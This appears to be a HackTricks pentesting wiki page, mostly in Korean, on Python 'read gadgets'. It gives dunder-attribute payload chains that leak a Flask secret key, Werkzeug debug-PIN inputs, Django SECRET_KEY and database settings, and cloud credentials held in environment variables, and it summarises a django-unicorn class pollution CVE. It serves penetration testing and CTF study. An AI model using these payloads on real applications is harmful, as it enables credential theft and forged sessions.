# Python 내부 읽기 가젯

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

다음과 같은 다양한 취약점([**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) 또는 [**Class Pollution**](class-pollution-pythons-prototype-pollution.md))은 **python 내부 데이터를 읽을 수 있게 하지만 코드 실행은 허용하지 않습니다**. 따라서 pentester는 이러한 읽기 권한을 최대한 활용하여 **민감한 권한을 획득하고 취약점의 영향을 확대해야 합니다**.

### Flask - 비밀 키 읽기

Flask 애플리케이션의 메인 페이지에는 아마도 **`app`** 전역 객체가 존재하며, 이곳에 **비밀이 구성되어 있습니다**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
이 경우 [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html)에 있는 어떤 gadget을 사용해도 **access global objects**를 통해 이 객체에 접근할 수 있다.

만약 **the vulnerability is in a different python file**, 파일을 횡단할 수 있는 gadget이 필요하며 메인 파일의 **access the global object `app.secret_key`**를 통해 Flask secret key를 변경하고 이 키를 알고 [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)할 수 있다.

A payload like this one [from this writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Use this payload to **change `app.secret_key`** (the name in your app might be different) to be able to sign new and more privileges flask cookies.

### Werkzeug - machine_id and node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/)을 사용하면 **machine_id**와 **uuid** 노드에 접근할 수 있습니다. 이들은 [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md)를 생성하는 데 필요한 **main secrets**로, **debug mode**가 활성화되어 있을 경우 `/console`에서 python console에 접근하는 데 사용할 수 있습니다:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> 웹 페이지에서 일부 **error**를 발생시켜 **서버의 `app.py` 로컬 경로**를 얻을 수 있다는 점에 유의하세요. 이 **error**가 **경로를 제공합니다**.

If the vulnerability is in a different python file, check the previous Flask trick to access the objects from the main python file.

### Django - SECRET_KEY 및 settings 모듈

Django settings 객체는 애플리케이션이 시작되면 `sys.modules`에 캐시됩니다. 읽기 primitives만으로 **`SECRET_KEY`**, 데이터베이스 자격증명 또는 서명용 salts를 leak할 수 있습니다:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```
취약한 gadget이 다른 모듈에 있다면, 먼저 globals를 순회하세요:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
키가 알려지면 Django 서명된 쿠키 또는 토큰을 Flask와 유사한 방식으로 위조할 수 있습니다.

### Environment variables / cloud creds via loaded modules

많은 jails에서는 여전히 어딘가에서 `os` 또는 `sys`를 import합니다. 접근 가능한 어떤 함수의 `__init__.__globals__`를 악용하여 이미 import된 `os` 모듈로 피벗하고 **environment variables**에 있는 API tokens, cloud keys 또는 flags를 덤프할 수 있습니다:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
서브클래스 인덱스가 필터링되어 있다면, loaders를 사용하세요:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
환경 변수는 종종 read에서 full compromise로 이동하는 데 필요한 유일한 비밀입니다 (cloud IAM keys, database URLs, signing keys, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) allowed **class pollution** via crafted component requests. `__init__.__globals__` 같은 프로퍼티 경로를 설정하면 공격자가 컴포넌트 모듈의 globals 및 임포트된 모듈들(예: `settings`, `os`, `sys`)에 도달할 수 있습니다. 거기서 code execution 없이 `SECRET_KEY`, `DATABASES` 또는 서비스 자격증명을 leak할 수 있습니다. 이 익스플로잇 체인은 순수하게 read 기반이며 위에서 언급한 것과 동일한 dunder-gadget 패턴을 사용합니다.

### 연결을 위한 Gadget 모음

최근 CTF들(예: jailCTF 2025)은 attribute access와 subclass enumeration만으로 구축된 신뢰 가능한 read 체인을 보여줍니다. 커뮤니티에서 유지하는 목록들인 [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) 등은 객체에서 `__globals__`, `sys.modules`로 이동하고 최종적으로 민감한 데이터에 도달하기 위해 결합할 수 있는 수백 개의 최소한의 gadget을 수록하고 있습니다. Python 마이너 버전 간에 인덱스나 클래스 이름이 다를 때 빠르게 적응하기 위해 이를 사용하세요.



## References

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
